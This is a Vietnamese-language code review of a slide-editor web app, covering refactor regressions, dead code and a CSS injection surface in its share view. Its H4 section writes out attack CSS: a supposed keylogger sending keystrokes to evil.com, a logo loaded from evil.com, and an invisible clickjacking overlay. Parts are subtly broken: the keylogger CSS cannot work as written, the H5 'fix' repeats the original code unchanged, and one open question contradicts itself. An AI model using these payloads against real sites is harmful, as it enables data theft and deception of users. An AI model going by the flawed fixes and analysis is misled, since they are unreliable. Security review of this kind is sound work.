# Code Review — Chi Tiết Từng Lỗi: Root Cause, Impact & Fix

**Date:** 2026-04-28
**Scope:** 304 files, ~37K changes — deep dive on 8 prioritized issues
**Verification:** Git diff vs HEAD, live code inspection, behavioral comparison

---

## Tổng Quan Phân Biệt Regression vs Pre-existing

| # | Issue | Regression? | Đã xác nhận |
|---|-------|------------|-------------|
| C1 | Ruler axis ngược | ❌ Pre-existing | ✅ Git diff verify |
| C2 | Ctrl+D không update clipboard | ✅ **Regression** | ✅ Live code diff |
| C3 | performDuplicate bypass lock guard | ❌ Dead code | ✅ Grep verify |
| H1 | Paste select last element | ❌ Unchanged | ✅ Git diff verify |
| H2 | Dead canvas hooks | ❌ Intentional | ✅ File scan |
| H3 | Shortcuts stale after mount | ✅ **Regression** | ✅ Live code |
| H4 | CSS injection share view | ⚠️ Design decision | ✅ Code review |
| M1 | Ordered lists no `<ol>` | ❌ Pre-existing | ✅ Git diff verify |

**3 regression thực sự:** C2, H3 (Phase 1 introduced), H4 (Phase 1 design change)

---

## C1 — Ruler Axis Bug (Pre-existing)

### Root Cause

```js
// canvas-rulers.jsx:68-79
const handleRulerMouseDown = (axis, _e) => {
  const onUp = (me) => {
    const pos = axis === 'x'
      ? (me.clientX - rect.left) / scale   // ← dùng clientX
      : (me.clientY - rect.top) / scale
    onAddGuide?.({ axis, position: Math.round(pos) })
  }
}
```

| Ruler | passes `axis` | Dùng | Tạo guide |
|-------|--------------|-------|-----------|
| Top ruler (line 97) | `axis='x'` | `clientX` → `rect.left` | `axis='x'` → **vertical** guide |
| Left ruler (line 110) | `axis='y'` | `clientY` → `rect.top` | `axis='y'` → **horizontal** guide |

**Vấn đề:** Khi click top ruler, `clientX` cho vị trí ngang → tạo vertical guide (đường đứng từ trên xuống dưới, `left: N`). Nhưng user muốn tạo horizontal guide (đường ngang từ trái sang phải, `top: N`). Logic bị đảo ngược.

**Hệ quả user:**
1. User click top ruler tại vị trí y=200 (mong đợi: horizontal guide ở hàng 200)
2. Thực tế: tạo vertical guide ở cột 200 → guide xuất hiện ở vị trí hoàn toàn sai
3. Guide không hữu ích cho alignment, user thấy guide xuất hiện nơi không mong đợi

**Tại sao pre-existing:** Git diff xác nhận original `SlideCanvas.jsx:737` có cùng logic. Bug tồn tại từ trước Phase 1/2/3 decomposition.

**Fix:**
```js
// canvas-rulers.jsx — swap axis labels
<div onMouseDown={(e) => handleRulerMouseDown('y', e)} /> {/* top ruler → pass 'y' */}
<div onMouseDown={(e) => handleRulerMouseDown('x', e)} /> {/* left ruler → pass 'x' */}
```
Top ruler tạo horizontal guide → `axis='y'`. Left ruler tạo vertical guide → `axis='x'`.

---

## C2 — Ctrl+D Không Update Clipboard (Regression — Phase 1)

### Root Cause — So sánh Before vs After

**BEFORE (original use-clipboard.js):**
```js
const performDuplicate = useCallback(() => {
  const { toAdd, clipboardData, lastId } = createDuplicateOperation({
    slideElements: slide?.elements,
    selectedElementIds,
  })
  if (clipboardData) setClipboard(clipboardData)  // ← clipboard được set
  toAdd.forEach((el) => addElement(el))
  if (lastId) selectElement(lastId)
}, [...])
```

**AFTER (new EditorPage.jsx):**
```js
const handleDuplicate = useCallback(() => {
  const { selectedElementIds: liveSelectedIds } = useEditorStore.getState()
  const slideEls = currentSlide?.elements || []
  const { toAdd } = createDuplicateOperation({   // ← bỏ qua clipboardData
    slideElements: slideEls,
    selectedElementIds: liveSelectedIds,
  })
  if (!toAdd.length) return
  setPresentation((prev) => ({
    ...prev,
    slides: prev.slides.map((s, i) =>
      i === idx ? { ...s, elements: [...s.elements, ...toAdd] } : s
    ),
  }))
  // KHÔNG gọi setClipboard → clipboard không được update
}, [...])
```

**Lý do regression:** Phase 1 refactor tách `handleDuplicate` ra khỏi `useClipboard` hook. `createDuplicateOperation` trả về 3 thứ: `toAdd`, `clipboardData`, `lastId`. Code mới chỉ dùng `toAdd`, bỏ qua `clipboardData`.

**Ảnh hưởng user — Scenario chi tiết:**
```
1. User chọn 1 text box "Hello"
2. Nhấn Ctrl+C → clipboard = ["Hello text box element data"]
3. Nhấn Ctrl+V → paste "Hello" → clipboard vẫn = ["Hello"]
4. User chọn 1 hình chữ nhật
5. Nhấn Ctrl+D → duplicate hình chữ nhật → hình mới được tạo
   NHƯNG clipboard VẪN = ["Hello"] (không được update)
6. User nhấn Ctrl+V → paste "Hello" (cái text box!) → text box được paste vào
   → User mong đợi paste hình chữ nhật (vì vừa duplicate)
```

**So sánh với PowerPoint:**
- PowerPoint: Ctrl+D **KHÔNG** update clipboard (chỉ duplicate)
- NavSlides trước Phase 1: Ctrl+D **CÓ** update clipboard
- NavSlides sau Phase 1: Ctrl+D **KHÔNG** update clipboard (regression từ behavior cũ)

**Fix — 1 dòng:**
```js
// EditorPage.jsx — thêm 1 dòng
const { toAdd, clipboardData } = createDuplicateOperation({...})
if (!toAdd.length) return
setPresentation((prev) => {...})
setClipboard(clipboardData)  // ← THÊM DÒNG NÀY
```

---

## C3 — performDuplicate Bypasses Lock Guard (Dead Code — Không ảnh hưởng thực tế)

### Root Cause

```
performDuplicate (useClipboard hook)
  └─ NEVER imported anywhere → dead export
     └─ Does NOT call createDuplicateOperation
        └─ Directly uses clipboardElements (no lock guard)

handleDuplicate (EditorPage — ACTUAL code path)
  └─ ALWAYS used → real implementation
     └─ Calls createDuplicateOperation
        └─ Line 69: locked element guard → CORRECT
```

### Tại sao không phải bug

Grep xác nhận `performDuplicate` từ `useClipboard` hook **không được import ở bất kỳ đâu** trong codebase:

```bash
$ grep -rn "performDuplicate" client/src/ --include="*.js" --include="*.jsx"
client/src/hooks/use-clipboard.js:179   ← export only
client/src/hooks/use-clipboard.js:197   ← return only
```

### Tại sao vẫn cần fix

Dead code nguy hiểm vì:
1. Test suite vẫn test `performDuplicate` (7 test cases)
2. Nếu ai đó wire lại `performDuplicate` vào (ví dụ trong tương lai), lock guard sẽ bị thiếu
3. Developer mới đọc code sẽ thấy `performDuplicate` có vẻ an toàn nhưng thực ra thiếu guard

**Fix:**
```js
// Option A: Remove dead function (recommended)
const performDuplicate = useCallback((clipboardElements) => {
  // XÓA toàn bộ function
}, [...])

// Option B: Fix it properly
const performDuplicate = useCallback((clipboardElements) => {
  const toAdd = clipboardElements || []
  if (!toAdd.length) return
  const filtered = toAdd.filter(el => !el.locked)  // ← add lock guard
  if (!filtered.length) return
  // ... rest unchanged
}, [...])
```

---

## H1 — Paste Chỉ Select Element Cuối (Pre-existing — Không Regression)

### Root Cause

**Cả original và new đều chỉ select lastId:**
```js
// Original (use-clipboard.js:138)
if (lastId) selectElement(lastId)

// New (use-clipboard.js:152)
if (lastId) selectElement(lastId)
```

### Ảnh hưởng user
```
1. User copy 3 elements (A, B, C)
2. Paste → được 3 element mới (A', B', C')
3. Chỉ C' được select
4. User muốn select tất cả → phải Ctrl+click từng cái
```

### Fix (Optional)
```js
// use-clipboard.js:createPasteOperation
// Thêm allIds vào return value
return { elements, allIds, lastId }

// use-clipboard.js:performPaste
// Select tất cả thay vì chỉ lastId
setSelectedElementIds(allIds)
```

---

## H2 — Dead Canvas Hook Files (Intentional — Phase 2 Decomposition)

### Root Cause

Phase 3 (chrome/interaction extraction) tạo 3 hook files nhưng chưa wire vào SlideCanvas:
- `use-canvas-pointer-interaction.js` — never imported
- `use-canvas-rubber-band-drag-selection.js` — never imported
- `use-canvas-resize-rotate.js` — chỉ import constants (`MIN_SIZE`, `applyResize`, `HANDLE_STYLES`, `getRotationAngle`)

### Ảnh hưởng

| File | Chức năng | Trạng thái | Rủi ro |
|------|-----------|-----------|---------|
| `use-canvas-pointer-interaction.js` | Mouse interaction logic | Dead | Cao — code có thể stale nếu SlideCanvas thay đổi |
| `use-canvas-rubber-band-drag-selection.js` | Rubber-band selection | Dead | Trung bình |
| `use-canvas-resize-rotate.js` | Resize/rotate logic | Partial — constants dùng, logic chưa | Thấp |

### Fix

**Option A (Khuyến nghị nếu có kế hoạch Phase 2):** Giữ nguyên files, thêm comment:
```js
// NOTE: These hooks are extracted for Phase 2 canvas decomposition.
// They are NOT yet wired into SlideCanvas.
// Timeline: Wire in next sprint (Phase 2 of canvas refactor).
```

**Option B (Nếu không có kế hoạch):** Xóa files để tránh confuse:
```bash
rm client/src/components/canvas/use-canvas-pointer-interaction.js
rm client/src/components/canvas/use-canvas-rubber-band-drag-selection.js
```

---

## H3 — Shortcuts Stale Sau Mount (Regression — Phase 1)

### Root Cause

```js
// use-keyboard.js:65-68
const shortcuts = useMemo(() => {
  const overrides = loadOverrides()  // đọc localStorage 1 lần
  return getShortcuts(overrides)
}, [])  // ← dependency rỗng → NEVER re-computed
```

`shortcuts` bị "đóng băng" tại thời điểm mount. Khi user thay đổi shortcut trong SettingsPage → localStorage được update → nhưng `useKeyboard` trong EditorPage vẫn dùng shortcuts cũ.

### Ảnh hưởng User — Scenario
```
1. User mở Editor → useKeyboard mount, đọc localStorage → shortcuts = {Ctrl+S: save}
2. User vào Settings → đổi Ctrl+S → Ctrl+Shift+S (để tránh conflict)
3. localStorage được update: {Ctrl+S: "custom-save-v2", Ctrl+Shift+S: "save"}
4. User quay lại Editor → nhấn Ctrl+S → vẫn chạy save (vì shortcuts vẫn là bản cũ)
   → Ctrl+Shift+S KHÔNG trigger được save
5. User phải F5 refresh để shortcuts được re-read
```

### Fix
```js
// Option A: Bỏ useMemo (recommended — localStorage reads are fast)
const shortcuts = getShortcuts(loadOverrides())

// Option B: Subscribe to localStorage changes (more complex)
```

---

## H4 — CSS Injection Surface Trong Share View (Design Decision)

### Root Cause

Phase 1 thay đổi design: DOMPurify bị loại khỏi share view để giữ HTML embeds "trusted và programmable."

```js
// server/index.js — CHỈ sanitize customCSS, không sanitize HTML elements
if (sanitized.customCSS) {
  sanitized.customCSS = sanitized.customCSS
    .replace(/expression\s*\(/gi, '/* blocked */(')
    .replace(/javascript\s*:/gi, '/* blocked */:')
    .replace(/url\s*\(\s*['"]?\s*javascript/gi, 'url(/* blocked */')
}
// HTML elements → KHÔNG có DOMPurify sanitize
```

### Attack Vector — CSS Keylogger

```css
/* customCSS được inject vào <head> không sandbox */
input[type="text"] { background-image: url("https://evil.com/log?k=" + event.key); }
```

Khi user nhập vào input trong presentation, mỗi phím được gửi đến `evil.com`.

### Attack Vector — Layout Manipulation

```css
/* Ẩn footer, thay đổi logo, overlay giả mạo */
.presentation-footer { display: none !important; }
.logo { content: url("https://evil.com/fake-logo.png") !important; }
```

### Attack Vector — Clickjacking preparation

```css
/* Tạo invisible overlay */
.slide-content::after {
  content: "CLICK HERE";
  position: absolute;
  inset: 0;
  opacity: 0;
  z-index: 9999;
  cursor: pointer;
}
```

### Mitigation hiện tại
- `expression()` bị chặn
- `javascript:` trong URL bị chặn
- Share tokens cần có mới xem được

### Fix

**Option A (Khuyến nghị):** Sandboxed iframe cho customCSS
```html
<iframe sandbox="allow-forms" srcdoc="<style>${sanitized.customCSS}</style>"></iframe>
```

**Option B:** CSS allowlist — chỉ cho phép safe properties
```js
// Chỉ cho phép color, font-size, background-color, v.v.
// Reject transform, position, z-index, content, background-image
```

---

## M1 — Ordered Lists Không Wrap `<ol>` (Pre-existing)

### Root Cause

```js
// markdown-import.js:119-123 — Unordered lists: 2 bước
html = html.replace(/^[-*] (.+)$/gm, '<li>$1</li>')
html = html.replace(/(<li.*<\/li>\n?)+/g,
  (match) => `<ul>${match}</ul>`)

// markdown-import.js:125 — Ordered lists: 1 bước (THIẾU wrap)
html = html.replace(/^\d+\. (.+)$/gm, '<li>$1</li>')
// KHÔNG có bước wrap → <li> không có parent <ol>
```

### Ảnh hưởng User
```
Input:  "1. First item\n2. Second item\n3. Third item"
Output: "<li>1. First item</li><li>2. Second item...</li>"
Browser render: plain text (no numbers) — vì <li> không có parent list
```

### Fix — 1 block
```js
// Sau dòng ordered list replacement, thêm wrap giống unordered:
// Ordered lists wrap
html = html.replace(
  /(<li[^>]*>.*<\/li>\n?)+/g,
  (match) => `<ol style="margin:8px 0;padding-left:20px;list-style:decimal;">${match}</ol>`
)
```

---

## H5 — withFileLock Fragile (Pre-existing)

### Root Cause

```js
// storage.js
async withFileLock(path, fn) {
  await this.lock[path]
  try {
    const data = readJson(path)  // ← read
    const result = fn(data)       // ← user mutation
    await writeJson(path, result) // ← write
  } finally {
    this.lock[path] = null         // ← unlock
  }
}
```

Nếu `fn(data)` throw SAU khi mutate nhưng TRƯỚC khi `writeJson` → data đã thay đổi nhưng lock đã release → operation tiếp theo đọc stale data.

### Fix
```js
async withFileLock(path, fn) {
  await this.lock[path]
  try {
    const data = readJson(path)
    const result = fn(data)
    await writeJson(path, result)
  } finally {
    this.lock[path] = null
  }
}
// Better: wrap fn in try/catch inside lock boundary
```

---

## Tổng Hợp Fix Priority

| Priority | Issue | Fix | Effort | Regression? |
|----------|-------|-----|--------|------------|
| P0 | C1 Ruler axis | Swap axis labels (2 dòng) | <5 min | No |
| P0 | C2 Ctrl+D clipboard | Add `setClipboard(clipboardData)` (1 dòng) | <5 min | **Yes** |
| P0 | H3 Stale shortcuts | Remove `useMemo` guard (1 dòng) | <5 min | **Yes** |
| P1 | M1 Ordered lists | Add `<ol>` wrap (3 dòng) | <5 min | No |
| P1 | H4 CSS injection | Sandboxed iframe (medium) | 1-2h | Design choice |
| P2 | C3 Dead export | Remove dead `performDuplicate` hoặc fix | 5 min | No |
| P2 | H2 Dead hooks | Wire hoặc xóa | 2-4h | No |

---

## Unresolved Questions

1. **C2 Design decision:** NavSlides behavior trước Phase 1 (Ctrl+D update clipboard) có đúng intended behavior không? Nếu PowerPoint paradigm đúng → fix để preserve (thêm setClipboard). Nếu PowerPoint paradigm đúng và Ctrl+D không nên update clipboard → close as "wontfix" cho C2.
2. **H2 Timeline:** Các dead canvas hooks có được wire trong Phase 2 không? Nếu có → giữ nguyên. Nếu không → nên xóa.
3. **H4 Risk assessment:** customCSS chỉ editable bởi presentation creator, không phải viewer. Self-XSS risk vs functionality benefit của trusted CSS — team cần decide.
4. **M1 Intent:** Ordered list wrap có từng được support trước đây không? Nếu có → regression. Nếu không → pre-existing bug từ đầu.
